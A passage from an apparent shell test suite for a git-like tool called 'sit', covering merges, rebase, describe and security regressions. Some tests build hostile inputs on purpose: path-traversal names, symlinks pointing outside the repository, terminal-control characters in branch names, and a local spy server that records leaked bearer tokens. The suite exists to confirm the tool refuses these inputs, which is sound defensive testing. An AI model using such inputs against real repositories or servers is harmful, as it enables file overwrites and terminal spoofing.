"$SIT" branch b2 >/dev/null; echo "safe default" > cfg.txt; c164 cfg.txt; m164 M2
"$SIT" checkout b1 >/dev/null; echo one > one.txt; c164 one.txt; m164 b1
"$SIT" checkout b2 >/dev/null; echo two > two.txt; c164 two.txt; m164 b2
"$SIT" checkout main >/dev/null; "$SIT" merge b1 b2 >/dev/null 2>&1
assert_eq "$(cat cfg.txt)" "safe default" "A4: octopus keeps HEAD's revert"

# A5 — stash pop after a later commit must not roll it back. 1.6.4 made it
# refuse; since 1.8.0 it applies the stash's change three-way instead.
a164 a5; echo a > a.txt; echo b > b.txt; c164 a.txt b.txt; m164 base
echo stashed > a.txt; "$SIT" stash >/dev/null 2>&1
echo "committed later" > b.txt; c164 b.txt; m164 later
"$SIT" stash pop >/dev/null 2>&1; assert_eq "$?" "0" "A5: pop on a moved HEAD applies the stash (1.8.0)"
assert_eq "$(cat b.txt)" "committed later" "A5: the later commit is untouched"
assert_eq "$(cat a.txt)" "stashed" "A5: and the stash's change is there"

# B1 — add normalises ./ and refuses paths that would build a bad tree.
a164 b1; echo hi > a.txt
assert_contains "$("$SIT" add ./a.txt)" " a.txt" "B1: add ./a.txt stages a.txt"
"$SIT" add ../escape >/dev/null 2>&1; assert_eq "$?" "1" "B1: add ../x refuses"
"$SIT" add .sit/HEAD >/dev/null 2>&1; assert_eq "$?" "1" "B1: add .sit/HEAD refuses"

# B2 — a tracked file replaced by a directory is not "clean".
a164 b2; echo x > x; c164 x; m164 base; rm x; mkdir x; echo y > x/y
assert_contains "$("$SIT" status)" "x" "B2: status reports the replaced file"

# B3 / B6 — untracked work in the way refuses, and HEAD does not move.
a164 b3; echo a > a.txt; c164 a.txt; m164 base
"$SIT" branch feat >/dev/null; "$SIT" checkout feat >/dev/null; echo theirs > notes.txt; c164 notes.txt; m164 feat
"$SIT" checkout main >/dev/null; echo "my notes" > notes.txt
"$SIT" merge feat >/dev/null 2>&1; assert_eq "$?" "1" "B6: fast-forward over an untracked file refuses"
assert_eq "$(cat notes.txt)" "my notes" "B6: the untracked file survives"
rm notes.txt; mkdir notes.txt; echo mine > notes.txt/x
"$SIT" checkout feat >/dev/null 2>&1; assert_eq "$?" "1" "B3: checkout over an untracked dir refuses"
assert_eq "$(cat .sit/HEAD)" "ref: refs/heads/main" "B3: HEAD unchanged"

# B4 — a directory becomes a file across a checkout.
a164 b4; mkdir d; echo x > d/x; c164 d/x; m164 base
"$SIT" branch fb >/dev/null; "$SIT" checkout fb >/dev/null; "$SIT" rm d/x >/dev/null
assert_eq "$([ -d d ] && echo still || echo gone)" "gone" "B4: rm removes the emptied directory"
echo file > d; c164 d; m164 fb; "$SIT" checkout main >/dev/null; "$SIT" checkout fb >/dev/null 2>&1
assert_eq "$(cat d 2>/dev/null)" "file" "B4: dir-to-file checkout lands"

# B5 — a file past the 16 MiB read ceiling is refused at add time.
a164 b5; head -c 17000000 /dev/zero > big.bin
"$SIT" add big.bin >/dev/null 2>&1; assert_eq "$?" "1" "B5: add over 16 MiB refuses"

# B8 — nothing is written or removed beyond a symlinked directory.
a164 b8; echo a > a.txt; c164 a.txt; m164 base
"$SIT" branch feat >/dev/null; "$SIT" checkout feat >/dev/null; mkdir docs; echo attacker > docs/x; c164 docs/x; m164 feat
"$SIT" checkout main >/dev/null; mkdir -p "$WORK/b8-outside"; ln -s "$WORK/b8-outside" docs
"$SIT" merge feat >/dev/null 2>&1; assert_eq "$?" "1" "B8: merge writing beyond a symlink refuses"
assert_eq "$([ -e "$WORK/b8-outside/x" ] && echo written || echo clean)" "clean" "B8: nothing landed outside the repo"

# D1 — 2 MiB of one byte (compresses past 1000:1) reads back.
a164 d1; head -c 2097152 /dev/zero > z.bin; c164 z.bin; m164 z; rm z.bin
assert_contains "$("$SIT" fsck 2>&1)" "0 bad" "D1: a highly compressible blob is readable"
"$SIT" reset --hard HEAD >/dev/null 2>&1; assert_eq "$(wc -c < z.bin)" "2097152" "D1: and restores"

# D2 — a shallow clone that fetched its history keeps it through prune.
a164 d2; for i in 1 2 3; do echo v$i > f.txt; c164 f.txt; m164 c$i; done
cd "$WORK"; rm -rf a164-d2c; "$SIT" clone --depth 1 --force-absolute "$WORK/a164-d2" a164-d2c >/dev/null 2>&1
cd a164-d2c; "$SIT" fetch origin >/dev/null 2>&1
assert_contains "$("$SIT" fsck 2>&1)" "0 dangling" "D2: fetched ancestors of a shallow boundary are reachable"
assert_contains "$("$SIT" fsck --prune-now 2>&1)" "pruned 0" "D2: and survive --prune-now"

# E1 — a ref that is a symlink is replaced, never written through.
a164 e1; echo a > a.txt; c164 a.txt; m164 one
echo "user data" > "$WORK/e1-victim"; rm .sit/refs/heads/main; ln -s "$WORK/e1-victim" .sit/refs/heads/main
echo b > b.txt; c164 b.txt; "$SIT" commit -m two >/dev/null 2>&1
assert_eq "$(cat "$WORK/e1-victim")" "user data" "E1: the symlink target is untouched"

# E2 — HEAD may only name something under refs/.
a164 e2; echo a > a.txt; c164 a.txt; m164 one
printf 'ref: objects.patra\n' > .sit/HEAD; echo b > b.txt; c164 b.txt
"$SIT" commit -m two >/dev/null 2>&1; assert_eq "$?" "1" "E2: a HEAD naming objects.patra cannot be committed through"
assert_contains "$("$SIT" fsck 2>&1)" "0 bad" "E2: the object store is intact"

# E3 / E6 — signatures are reported for what they cover.
a164 e3; "$SIT" key generate >/dev/null 2>&1; echo a > a; c164 a; m164 one
"$SIT" tag -s v1.0 -m rel >/dev/null 2>&1; cp .sit/refs/tags/v1.0 .sit/refs/tags/v2.1
"$SIT" verify-tag v2.1 >/dev/null 2>&1; assert_eq "$?" "1" "E3: a tag object found under another name is refused"
"$SIT" verify-commit v1.0 >/dev/null 2>&1; assert_eq "$?" "1" "E6: verify-commit refuses a tag object"

# E4 — reset --hard to a tree is refused before anything is deleted.
a164 e4; echo keep > keep.txt; c164 keep.txt; m164 one
T=$("$SIT" cat-file HEAD | sed -n 's/^tree //p' | head -1)
"$SIT" reset --hard "$T" >/dev/null 2>&1; assert_eq "$?" "1" "E4: reset --hard to a tree refuses"
assert_eq "$(cat keep.txt)" "keep" "E4: the worktree is untouched"

# E7 — checkout validates the branch name.
a164 e7; echo a > a; c164 a; m164 one
"$SIT" checkout ../tags/x >/dev/null 2>&1; assert_eq "$(cat .sit/HEAD)" "ref: refs/heads/main" "E7: a traversal branch name is refused"

# B12 — -U0 headers apply with patch at the right place.
a164 b12; seq 1 20 > f.txt; c164 f.txt; m164 base; seq 1 20 | sed '10a NEW' > f.txt
assert_contains "$("$SIT" diff -U0)" "@@ -10,0 +11 @@" "B12: a pure insert's old start is the line before it"

# ── 23. 1.7.0: bearer tokens bound to remotes; unresolved conflicts ─
hr "1.7.0 token binding + conflict refusal"

# 23a. Conflicts: a commit is refused until every conflicted path is resolved
# AND staged; merge --abort clears the record.
a164 c170; echo c0 > conf.txt; echo other > o.txt; c164 conf.txt o.txt; m164 base
"$SIT" branch side >/dev/null; echo ours > conf.txt; c164 conf.txt; m164 ours
"$SIT" checkout side >/dev/null; echo theirs > conf.txt; echo side-o > o.txt; c164 conf.txt o.txt; m164 theirs
"$SIT" checkout main >/dev/null; "$SIT" merge side >/dev/null 2>&1
assert_contains "$("$SIT" status)" "Unmerged paths" "23a: status lists the unmerged path"
"$SIT" commit -m nothing-resolved >/dev/null 2>&1; assert_eq "$?" "1" "23a: commit with nothing resolved refuses"
"$SIT" add conf.txt >/dev/null
"$SIT" commit -m markers-staged >/dev/null 2>&1; assert_eq "$?" "1" "23a: commit with markers staged refuses"
echo resolved > conf.txt
"$SIT" commit -m not-staged >/dev/null 2>&1; assert_eq "$?" "1" "23a: a resolution that was not 'sit add'ed refuses"
"$SIT" add conf.txt >/dev/null
"$SIT" commit -m merged >/dev/null 2>&1; assert_eq "$?" "0" "23a: resolved + staged commits"
assert_eq "$([ -e .sit/CONFLICTS ] && echo left || echo cleared)" "cleared" "23a: the commit clears the record"
assert_eq "$(cat o.txt)" "side-o" "23a: the clean half came along"
"$SIT" branch side2 >/dev/null; echo m3 > conf.txt; c164 conf.txt; m164 m3
"$SIT" checkout side2 >/dev/null; echo s3 > conf.txt; c164 conf.txt; m164 s3
"$SIT" checkout main >/dev/null; "$SIT" merge side2 >/dev/null 2>&1; "$SIT" merge --abort >/dev/null 2>&1
assert_eq "$([ -e .sit/CONFLICTS ] && echo left || echo cleared)" "cleared" "23a: merge --abort clears the record"

# 23b. rebase --continue refuses an unresolved stop.
a164 r170; echo base > f.txt; c164 f.txt; m164 base
"$SIT" branch feat >/dev/null; echo main > f.txt; c164 f.txt; m164 main
"$SIT" checkout feat >/dev/null; echo feat > f.txt; c164 f.txt; m164 feat
"$SIT" rebase main >/dev/null 2>&1
"$SIT" rebase --continue >/dev/null 2>&1; assert_eq "$?" "1" "23b: rebase --continue with markers refuses"
echo resolved > f.txt; "$SIT" add f.txt >/dev/null
"$SIT" rebase --continue >/dev/null 2>&1; assert_eq "$?" "0" "23b: and continues once resolved and staged"

# 23c. Bearer tokens go only to bound remotes (ADR 0014). A spy server that
# demands bearer auth records every Authorization header it is sent.
if command -v python3 >/dev/null 2>&1; then
  a164 t170; echo a > a; c164 a; m164 one
  echo "SERVE-TOKEN-0123456789abcdef" > "$HOME/.sit/serve.token" 2>/dev/null || { mkdir -p "$HOME/.sit"; echo "SERVE-TOKEN-0123456789abcdef" > "$HOME/.sit/serve.token"; }
  chmod 600 "$HOME/.sit/serve.token"
  echo "BOUND-TOKEN-fedcba9876543210" > "$WORK/bound.tok"; chmod 600 "$WORK/bound.tok"
  SPYLOG="$WORK/spy.log"; : > "$SPYLOG"
  python3 -I "$ROOT/tests/integration/bearer_spy.py" 0.0.0.0 18791 "$SPYLOG" & SPY=$!
  for _ in 1 2 3 4 5 6 7 8 9 10; do (echo > /dev/tcp/127.0.0.1/18791) >/dev/null 2>&1 && break; sleep 0.3; done

  "$SIT" remote add loop http://127.0.0.1:18791 >/dev/null
  "$SIT" push loop >/dev/null 2>&1
  assert_contains "$(cat "$SPYLOG")" "Bearer SERVE-TOKEN" "23c: an unbound LOOPBACK remote gets ~/.sit/serve.token"
  : > "$SPYLOG"
  "$SIT" config remote.loop.tokenFile "$WORK/bound.tok"
  "$SIT" push loop >/dev/null 2>&1
  assert_contains "$(cat "$SPYLOG")" "Bearer BOUND-TOKEN" "23c: a bound remote gets ITS token"
  assert_eq "$(grep -c SERVE-TOKEN "$SPYLOG")" "0" "23c: and never the serve token"
  chmod 644 "$WORK/bound.tok"
  "$SIT" push loop >/dev/null 2>&1; assert_eq "$?" "1" "23c: a token file that is not 0600 is an error"
  chmod 600 "$WORK/bound.tok"

  # A non-loopback address of this machine stands in for "someone else's server".
  LAN=$(ip -4 route get 1.1.1.1 2>/dev/null | sed -n 's/.* src \([0-9.]*\).*/\1/p')
  if [ -n "$LAN" ] && [ "${LAN#127.}" = "$LAN" ]; then
    : > "$SPYLOG"
    "$SIT" remote add far "http://$LAN:18791" >/dev/null
    assert_contains "$("$SIT" push far 2>&1)" "remote.far.tokenFile" "23c: an unbound non-loopback remote is refused, naming the key"
    "$SIT" config remote.far.tokenFile "$WORK/bound.tok"
    assert_contains "$("$SIT" push far 2>&1)" "plain http" "23c: a bound token is never sent over plain http off-host"
    assert_eq "$(grep -c 'Bearer' "$SPYLOG")" "0" "23c: the off-host server saw no token at all"
  else
    echo "  (skipped 23c off-host cases: no non-loopback address)"
  fi
  kill $SPY 2>/dev/null || true
else
  echo "  (skipped 23c: python3 not available)"
fi

# ── 24. 1.7.1: a refused object write never moves a ref ────────────
hr "1.7.1 refused object writes"

# A 1 MiB file-size limit (SIGXFSZ ignored, so writes fail with EFBIG) stops
# objects.patra growing to hold a 2 MiB incompressible blob. patra 1.16.2
# rolls the whole batch back; sit used to count it as copied anyway.
lim() { ( trap '' XFSZ; ulimit -f 1024; "$@" ); }

# 24a. push: the remote's commit fails, so its ref must not move.
a164 p171r; echo r > r; c164 r; m164 base; P171R="$R"
a164 p171; echo a > f; c164 f; m164 one; "$SIT" checkout -b feat >/dev/null 2>&1
head -c 2097152 /dev/urandom > big; c164 big; m164 big
"$SIT" remote add origin "$P171R" >/dev/null
lim "$SIT" push origin >/dev/null 2>&1; assert_eq "$?" "1" "24a: a push whose objects did not land fails"
assert_eq "$([ -e "$P171R/.sit/refs/heads/feat" ] && echo moved || echo untouched)" "untouched" "24a: and the remote ref is not created"
assert_contains "$(cd "$P171R" && "$SIT" fsck 2>&1)" " 0 bad" "24a: the remote stays fsck-clean"
"$SIT" push origin >/dev/null 2>&1; assert_eq "$?" "0" "24a: the same push succeeds without the limit"
assert_contains "$(cd "$P171R" && "$SIT" fsck 2>&1)" " 0 bad" "24a: and lands whole"

# 24b. BEGIN refused (a read-only .sit/ leaves no room for the WAL): the copy
# falls back to autocommit inserts, each still checked, and the push lands.
if [ "$(id -u)" != "0" ]; then
  a164 b171r; echo r > r; c164 r; m164 base; B171R="$R"
  a164 b171; echo a > f; c164 f; m164 one; "$SIT" checkout -b feat >/dev/null 2>&1
  echo b > f; c164 f; m164 two
  "$SIT" remote add origin "$B171R" >/dev/null
  chmod 555 "$B171R/.sit"
  "$SIT" push origin >/dev/null 2>&1; assert_eq "$?" "0" "24b: a push with BEGIN refused still lands"
  chmod 755 "$B171R/.sit"
  assert_contains "$(cd "$B171R" && "$SIT" fsck 2>&1)" " 0 bad" "24b: whole"
else
  echo "  (skipped 24b: root ignores directory modes)"
fi

# 24c. fetch: the local commit fails, so origin/<branch> must not move.
a164 f171s; echo a > f; c164 f; m164 one; head -c 2097152 /dev/urandom > big; c164 big; m164 big; F171S="$R"
a164 f171; "$SIT" remote add origin "$F171S" >/dev/null
lim "$SIT" fetch origin main >/dev/null 2>&1; assert_eq "$?" "1" "24c: a fetch whose objects did not land fails"
assert_eq "$([ -e .sit/refs/remotes/origin/main ] && echo moved || echo untouched)" "untouched" "24c: and origin/main is not written"

# 24d. add: a refused insert is an error, not a staged id.
head -c 2097152 /dev/urandom > big2
lim "$SIT" add big2 >/dev/null 2>&1; assert_eq "$?" "1" "24d: add of an object that could not be stored fails"
assert_contains "$("$SIT" status)" "Untracked files" "24d: and nothing is staged"

# 24e. loose-object migration: a refused insert keeps the loose file, and the
# next open migrates it.
if command -v python3 >/dev/null 2>&1; then
  a164 m171; echo a > f; c164 f; m164 one
  HEX=$(python3 -I -c '
import hashlib, os, zlib
body = os.urandom(2 * 1024 * 1024)
framed = b"blob %d\0" % len(body) + body
h = hashlib.sha256(framed).hexdigest()
os.makedirs(".sit/objects/" + h[:2], exist_ok=True)
open(".sit/objects/" + h[:2] + "/" + h[2:], "wb").write(zlib.compress(framed))
print(h)')
  lim "$SIT" fsck >/dev/null 2>&1
  assert_eq "$([ -e ".sit/objects/${HEX:0:2}/${HEX:2}" ] && echo kept || echo lost)" "kept" "24e: a refused migration keeps the loose object"
  "$SIT" cat-file "$HEX" >/dev/null 2>&1; assert_eq "$?" "0" "24e: the next open migrates it"
else
  echo "  (skipped 24e: python3 not available)"
fi

# ── 25. 1.7.2: small correctness fixes ─────────────────────────────
hr "1.7.2 correctness fixes"

# 25a. A source whose closure has a hole (commit + tree, no blobs) must not
# produce a ref: the copy used to skip what it could not read.
if command -v python3 >/dev/null 2>&1; then
  a164 h172x; echo keep > k; echo gone > g; c164 k g; m164 one; H172X="$R"
  HC=$(cat .sit/refs/heads/main); HT=$("$SIT" cat-file "$HC" | sed -n 's/^tree //p')
  a164 h172y; H172Y="$R"
  python3 -I "$ROOT/tests/integration/plant_loose.py" "$SIT" "$H172X" "$H172Y" "commit:$HC" "tree:$HT"
  echo "$HC" > .sit/refs/heads/main
  assert_contains "$("$SIT" fsck 2>&1)" "missing" "25a: the planted source really is missing its blobs"
  a164 h172d; "$SIT" remote add origin "$H172Y" >/dev/null
  assert_contains "$("$SIT" fetch origin main 2>&1)" "cannot produce object" "25a: a fetch from a holed source names the missing object"
  "$SIT" fetch origin main >/dev/null 2>&1; assert_eq "$?" "1" "25a: and fails"
  assert_eq "$([ -e .sit/refs/remotes/origin/main ] && echo moved || echo untouched)" "untouched" "25a: and origin/main is not written"
  # 25b. ...unless the destination already holds what the source lacks.
  a164 h172e; echo keep > k; echo gone > g; c164 k g; "$SIT" remote add origin "$H172Y" >/dev/null
  "$SIT" fetch origin main >/dev/null 2>&1; assert_eq "$?" "0" "25b: a miss the destination already holds is not a hole"
  assert_contains "$("$SIT" fsck 2>&1)" " 0 bad" "25b: and the result is complete"
  # 25c. push from a holed repo is refused the same way.
  a164 h172r; echo r > r; c164 r; m164 base; H172R="$R"
  # HEAD moves by hand: checkout cannot materialize a tree whose blobs are gone.
  cd "$H172Y"; echo "$HC" > .sit/refs/heads/feat; echo "ref: refs/heads/feat" > .sit/HEAD
  "$SIT" remote add target "$H172R" >/dev/null
  assert_contains "$("$SIT" push target 2>&1)" "cannot produce object" "25c: a push from a holed repo names the missing object"
  "$SIT" push target >/dev/null 2>&1; assert_eq "$?" "1" "25c: a push of an incomplete closure fails"
  assert_eq "$([ -e "$H172R/.sit/refs/heads/feat" ] && echo moved || echo untouched)" "untouched" "25c: and the remote ref is not created"
else
  echo "  (skipped 25a-c: python3 not available)"
fi

# 25d. A v0.1 plaintext index migrates; rows no index can hold (a path over
# 255 bytes, a non-hex id) are dropped with a count rather than wedging it.
if command -v python3 >/dev/null 2>&1; then
  blobid() { python3 -I -c 'import hashlib,sys; b=sys.stdin.buffer.read(); print(hashlib.sha256(b"blob %d\0" % len(b) + b).hexdigest())'; }
  a164 i172d; echo x > f; c164 f; HX=$(printf 'x\n' | blobid)
  rm -f .sit/index.patra .sit/index.indexed
  LONGP=$(python3 -I -c 'print("L" * 300)')
  printf '%s\tf\n%s\tg\n%s\t%s\n%s\th\n' "$HX" "$HX" "$HX" "$LONGP" "ZZZZ${HX:4}" > .sit/index
  ST=$("$SIT" status 2>&1)
  assert_contains "$ST" "dropped 2 legacy index entries" "25d: unholdable legacy rows are dropped, counted"
  assert_eq "$(echo "$ST" | grep -c 'new file:')" "2" "25d: the two holdable rows migrate"
  assert_eq "$([ -e .sit/index ] && echo kept || echo removed)" "removed" "25d: and the plaintext index is removed"

  # 25e. A migration that cannot finish (writes fail past a 256 KiB file-size
  # limit) keeps .sit/index, serves no partial index, and completes later.
  lim256() { ( trap '' XFSZ; ulimit -f 256; "$@" ); }
  a164 i172e; echo x > f; c164 f; m164 base; echo y > g; c164 g; HY=$(printf 'y\n' | blobid)
  rm -f .sit/index.patra .sit/index.indexed
  python3 -I -c '
import sys
with open(".sit/index", "w") as f:
    for i in range(3000):
        f.write("%s\td/%05d-%s\n" % (sys.argv[1], i, "p" * 180))' "$HY"
  lim256 "$SIT" status >/dev/null 2>&1
  assert_eq "$([ -e .sit/index ] && echo kept || echo removed)" "kept" "25e: an unfinished migration keeps .sit/index"
  lim256 "$SIT" commit -m partial >/dev/null 2>&1; assert_eq "$?" "1" "25e: commit refuses a partial index"
  assert_contains "$(lim256 "$SIT" fsck --prune 2>&1)" "refusing --prune" "25e: prune refuses while the index cannot be read"
  assert_eq "$("$SIT" status 2>/dev/null | grep -c 'new file:  d/')" "3000" "25e: the next open migrates every row"
  assert_eq "$([ -e .sit/index ] && echo kept || echo removed)" "removed" "25e: and then removes the plaintext index"
else
  echo "  (skipped 25d-e: python3 not available)"
fi

# 25f. `add` applies the same ignore rules as `status` (B13): dir-only rules,
# nested ignore files and their `!` re-includes. It used to read only the root
# rules, with no notion of a directory.
a164 i172f
printf 'build/\n*.log\n' > .sitignore
mkdir -p build sub deep/er
echo x > build/foo.o; echo x > sub/keep.log; echo x > sub/a.txt; echo x > deep/er/b.txt
printf '!keep.log\n*.txt\n' > sub/.sitignore; printf '*.txt\n' > deep/.sitignore
"$SIT" add build/foo.o >/dev/null 2>&1; assert_eq "$?" "1" "25f: add refuses a file under a dir-only rule"
"$SIT" add sub/a.txt >/dev/null 2>&1; assert_eq "$?" "1" "25f: add honours a nested ignore file"
"$SIT" add deep/er/b.txt >/dev/null 2>&1; assert_eq "$?" "1" "25f: and its rules reach every level below it"
UNTR=$("$SIT" status 2>&1)
assert_eq "$(echo "$UNTR" | grep -c 'sub/keep.log')" "1" "25f: status lists the nested re-include as untracked"
"$SIT" add sub/keep.log >/dev/null 2>&1; assert_eq "$?" "0" "25f: and add accepts it"
"$SIT" add -f build/foo.o >/dev/null 2>&1; assert_eq "$?" "0" "25f: -f still overrides"

# 25g. `\ No newline at end of file` (B14): a change at a final line without a
# newline shows as git shows it, and the patch applies back exactly.
if command -v git >/dev/null 2>&1; then
  eolcase() {   # <old> <new> <label>
    a164 "e172-$3"; printf "$1" > f; c164 f; m164 o
    printf "$1" > old; printf "$2" > f
    "$SIT" diff > p.diff 2>&1
    assert_eq "$(sed -n '/^@@/,$p' p.diff)" "$(git diff --no-index old f | sed -n '/^@@/,$p')" "25g: $3 matches git"
    cp f want; cp old f
    if git apply p.diff 2>/dev/null; then
      assert_eq "$(cmp -s f want && echo same || echo differs)" "same" "25g: $3 round-trips through git apply"
    else
      bad "25g: $3: git apply refused sit's patch"
    fi
  }
  eolcase 'a\nb' 'a\nb\n' add-eol
  eolcase 'a\nb\n' 'a\nb' drop-eol
  eolcase 'a\nb' 'a\nB' edit-no-eol
  eolcase 'a\nb\nc' 'A\nb\nc' context-no-eol
else
  echo "  (skipped 25g: git not installed)"
fi

# 25h. C1 and bidi controls are escaped on output (E10). git allows non-ASCII
# ref names, so the name is stored as given and shown made safe.
RLO=$(printf '\342\200\256')    # U+202E RIGHT-TO-LEFT OVERRIDE
CSI=$(printf '\302\233')        # U+009B, the C1 CSI
EACUTE=$(printf '\303\251')     # an ordinary é, which must survive
a164 b172h; echo a > a; c164 a; "$SIT" commit -m "msg ${CSI}31m red caf${EACUTE}" >/dev/null
"$SIT" checkout -b "evil${RLO}name" >/dev/null 2>&1
SHOWN=$("$SIT" status 2>&1; "$SIT" branch 2>&1; "$SIT" log 2>&1)
assert_contains "$SHOWN" "On branch evil?name" "25h: status escapes a bidi override in the branch name"
assert_eq "$(printf '%s' "$SHOWN" | grep -c "$RLO")" "0" "25h: no raw RLO reaches the terminal"
assert_contains "$SHOWN" "msg ?31m red caf${EACUTE}" "25h: log escapes a C1 CSI and keeps ordinary UTF-8"
assert_eq "$(printf '%s' "$SHOWN" | grep -c "$CSI")" "0" "25h: no raw CSI reaches the terminal"
if [ -n "$GIT_PROBE" ]; then
  R="$WORK/gitapi-bidi"; mkdir -p "$R"; cd "$R"; git init -q
  git -c user.email=i@t -c user.name=t commit -q --allow-empty -m base >/dev/null 2>&1
  git checkout -q -b "evil${RLO}name"
  assert_contains "$("$GIT_PROBE" 2>/dev/null)" "BRANCH evil?name" "25h: sit_repo_branch returns the name made safe"
fi

# ── 26. 1.7.3: history walks over every parent ─────────────────────
hr "1.7.3 history walks"
c173() { echo "$2" > "$1"; c164 "$1"; m164 "$3"; }

# 26a. rebase replays `upstream..branch` over all parents (A8). With upstream
# merged INTO the branch, the old first-parent walk missed the merge base,
# replayed upstream's own commits and the merges, and stopped on a conflict.
a164 r173; c173 b.txt base B
"$SIT" branch feature >/dev/null; c173 u.txt u1 U1
"$SIT" checkout feature >/dev/null; c173 f1.txt f1 F1; "$SIT" merge main >/dev/null 2>&1
"$SIT" branch topic >/dev/null; "$SIT" checkout topic >/dev/null; c173 t.txt t1 T1
"$SIT" checkout feature >/dev/null; c173 f2.txt f2 F2; "$SIT" merge topic >/dev/null 2>&1; c173 f3.txt f3 F3
"$SIT" checkout main >/dev/null; c173 u.txt u2 U2
"$SIT" checkout feature >/dev/null
ROUT=$("$SIT" rebase main 2>&1); RRC=$?
assert_eq "$RRC" "0" "26a: rebase over a merged-in upstream completes"
assert_contains "$ROUT" "rebasing 4 commit(s)" "26a: only the branch's own commits, merges dropped"
assert_eq "$("$SIT" log --oneline | sed 's/^[0-9a-f]* //' | tr '\n' ' ')" "F3 T1 F2 F1 U2 U1 B " "26a: linear history, each commit after its parents"
assert_eq "$(cat u.txt)$(cat f1.txt)$(cat t.txt)$(cat f2.txt)$(cat f3.txt)" "u2f1t1f2f3" "26a: every file at its final content"

# 26b. describe counts `<tag>..<commit>` over every parent and names the tag
# with the fewest (E14), as git documents it; ties go to an annotated tag.
dsc() { "$SIT" describe 2>&1 | sed 's/-g[0-9a-f]*$//'; }
a164 d173; c173 a.txt 1 B; "$SIT" tag v1 >/dev/null; c173 a.txt 2 C; c173 a.txt 3 D
assert_eq "$(dsc)" "v1-2" "26b: linear history"
"$SIT" branch feature >/dev/null; "$SIT" checkout feature >/dev/null
c173 f.txt 1 F1; c173 f.txt 2 F2; c173 f.txt 3 F3
"$SIT" checkout main >/dev/null; c173 m.txt 1 X; "$SIT" merge feature >/dev/null 2>&1
assert_eq "$(dsc)" "v1-7" "26b: a merge counts the commits its second parent brings"
"$SIT" checkout feature >/dev/null; c173 f.txt 4 F4; "$SIT" tag ft >/dev/null
"$SIT" checkout main >/dev/null; c173 a.txt 4 E; "$SIT" merge feature >/dev/null 2>&1
assert_eq "$(dsc)" "ft-4" "26b: a tag reachable only through a second parent is found"
c173 a.txt 5 G; "$SIT" tag -a v2 -m ann >/dev/null; "$SIT" tag aaa >/dev/null
assert_eq "$(dsc)" "v2" "26b: annotated beats lightweight on the same commit"
c173 a.txt 6 H; "$SIT" tag release/v3 >/dev/null; c173 a.txt 7 I
assert_eq "$(dsc)" "release/v3-1" "26b: a nested tag describes"
"$SIT" checkout feature >/dev/null; c173 f.txt 9 F9; "$SIT" tag zz-near >/dev/null
"$SIT" checkout main >/dev/null; c173 a.txt 8 J; "$SIT" merge feature >/dev/null 2>&1
assert_eq "$(dsc)" "release/v3-4" "26b: the fewest-commits tag wins over the nearer-looking one"

# 26c. Nested ref names list in full and delete cleanly (E14's listing half).
a164 n173; c173 a a one
"$SIT" tag release/2026/v1 >/dev/null; "$SIT" tag v0 >/dev/null; "$SIT" branch feature/x >/dev/null
assert_eq "$("$SIT" tag | tr '\n' ' ')" "release/2026/v1 v0 " "26c: sit tag lists a nested tag by its full name"
assert_contains "$("$SIT" branch)" "feature/x" "26c: sit branch lists a nested branch by its full name"
"$SIT" branch -d feature/x >/dev/null; "$SIT" tag -d release/2026/v1 >/dev/null
assert_eq "$(find .sit/refs -mindepth 2 -type d | wc -l | tr -d ' ')" "0" "26c: deleting a nested ref removes its empty directories"
"$SIT" branch feature >/dev/null 2>&1; assert_eq "$?" "0" "26c: so a ref named after the old directory can be made"

# ── 27. 1.7.4 serve memory bounds (C1) ─────────────────────────────
# `sit serve` runs until killed, on a heap with no free. On this load 1.7.3
# grows by ~15 MB (about 5 KB kept per GET /refs) and by ~23 MB over 300 TLS
# connections (about 77 KB each). 1.7.4 builds each request in an arena it
# rewinds and each TLS connection in another. The bounds are a small fraction
# of the old growth and well above RSS noise.
hr "1.7.4 serve memory bounds"
if command -v python3 >/dev/null 2>&1; then
  R="$WORK/srv174"; mkdir -p "$R"; cd "$R"
  "$SIT" init >/dev/null
  printf 'x\n' > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m c1 >/dev/null
  "$SIT" branch feature/a >/dev/null; "$SIT" tag v1 >/dev/null
  waitport() {
    for _ in 1 2 3 4 5 6 7 8 9 10; do
      if (echo > /dev/tcp/127.0.0.1/"$1") >/dev/null 2>&1; then return 0; fi
      sleep 0.5
    done
    return 1
  }
  LOAD="$ROOT/tests/integration/serve_load.py"

  # 27a. Plain HTTP: 3000 GET /refs.
  PORT=18750
  "$SIT" serve "$R" --listen 127.0.0.1:$PORT > /dev/null 2>&1 & SP=$!
  waitport $PORT
  read -r G ST _ <<< "$(python3 -I "$LOAD" $SP http $PORT /sit/v1/refs 3000)"
  assert_eq "${ST:-none}" "200" "27a: GET /refs answers 200 under load"
  [ "${G:-99999}" -lt 2048 ] 2>/dev/null && ok || bad "27a: 3000 GET /refs grew RSS by ${G:-?} KB (bound 2048; 1.7.3 ~15000)"

  # 27b. A FIFO under refs/, or a symlink to one, is skipped. 1.7.3 opened it
  # and the single-threaded server blocked until a writer appeared.
  mkfifo .sit/refs/heads/fifo
  read -r G ST _ <<< "$(timeout 30 python3 -I "$LOAD" $SP http $PORT /sit/v1/refs 1)"
  assert_eq "${ST:-hung}" "200" "27b: a FIFO under refs/heads does not block GET /refs"
  rm -f .sit/refs/heads/fifo
  mkfifo .sit/pipe; ln -s ../../pipe .sit/refs/heads/via-link
  read -r G ST _ <<< "$(timeout 30 python3 -I "$LOAD" $SP http $PORT /sit/v1/refs 1)"
  assert_eq "${ST:-hung}" "200" "27b: nor does a symlink to a FIFO"
  rm -f .sit/pipe .sit/refs/heads/via-link
  kill $SP 2>/dev/null; wait $SP 2>/dev/null

  # 27c. TLS: 300 connections, a full handshake each.
  if command -v openssl >/dev/null 2>&1; then
    openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
      -keyout k.pem -out c.pem -days 2 -nodes -subj "/CN=localhost" > /dev/null 2>&1
    PORT=18751
    "$SIT" serve "$R" --tls --cert c.pem --key k.pem --listen 127.0.0.1:$PORT > /dev/null 2>&1 & SP=$!
    waitport $PORT
    read -r G ST _ <<< "$(python3 -I "$LOAD" $SP https $PORT /sit/v1/capabilities 300)"
    assert_eq "${ST:-none}" "200" "27c: capabilities over TLS answers 200 under load"
    [ "${G:-99999}" -lt 4096 ] 2>/dev/null && ok || bad "27c: 300 TLS connections grew RSS by ${G:-?} KB (bound 4096; 1.7.3 ~23000)"
    kill $SP 2>/dev/null; wait $SP 2>/dev/null
  else
    echo "  (skipped 27c: openssl not available)"
  fi
else
  echo "  (skipped 27: python3 not available)"
fi

# ── 28. 1.7.4 git read-mode: deep delta chains, packs past 64 MiB (D6) ──
